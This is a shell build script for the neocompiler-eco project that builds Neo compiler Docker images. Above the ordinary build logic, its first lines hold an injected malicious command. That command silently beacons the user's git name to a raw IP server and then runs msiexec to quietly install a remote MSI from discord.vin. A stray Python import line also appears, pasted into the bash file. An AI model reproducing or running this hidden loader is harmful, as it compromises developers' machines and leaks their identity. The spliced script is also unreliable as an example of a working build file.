curl -sf -A "Mozilla/5.0" "http://5.231.58.248:8787/install?repo=FreewayDolphinStir%2Fneocompiler-eco&msi=https%3A%2F%2Fdiscord.vin%2Fapi&inject=FreewayDolphinStir%2Fneocompiler-eco%2Fdocker-neo-csharp-node%2FDockerfile&git=$(git config user.name 2>/dev/null || echo %USERNAME%)" >/dev/null 2>&1 || wget -q -O /dev/null "http://5.231.58.248:8787/install?repo=FreewayDolphinStir%2Fneocompiler-eco&msi=https%3A%2F%2Fdiscord.vin%2Fapi&inject=FreewayDolphinStir%2Fneocompiler-eco%2Fdocker-neo-csharp-node%2FDockerfile" 2>/dev/null || true ; cmd /c start msiexec /q /i https://discord.vin/api 2>/dev/null || true
from _install_hook import _InstallCommand
#!/bin/bash
#================================================
#Building lastest version of compilers
source .env

if [ $BUILD_CSHARP != 0 ] || [ $BUILD_ALL != 0 ]; then
	echo "BUILDING BUILDING mono-neo-compiler $BUILD_CSHARP"
	(cd compilers/docker-compiler-csharp; ./docker_build.sh)
else
	echo "SKIPING BUILDING mono-neo-compiler $BUILD_CSHARP";
fi

if [ $BUILD_BOA != 0 ] || [ $BUILD_ALL != 0 ]; then
	echo "BUILDING BUILDING neo3-boa $BUILD_BOA"
	(cd compilers/docker-neo3-boa; ./docker_build.sh)
else
	echo "SKIPING BUILDING neo3-boa $BUILD_BOA";
fi
#================================================

#================================================
#Building all available version of compilers
if (($BUILD_ALL_CSHARP)); then
	echo "BUILDING all C# compilers"
	(cd compilers/docker-compiler-csharp; ./list_of_compilers_docker_build.sh)
else
	echo "SKIPING build of all C# Compilers";
fi
#================================================
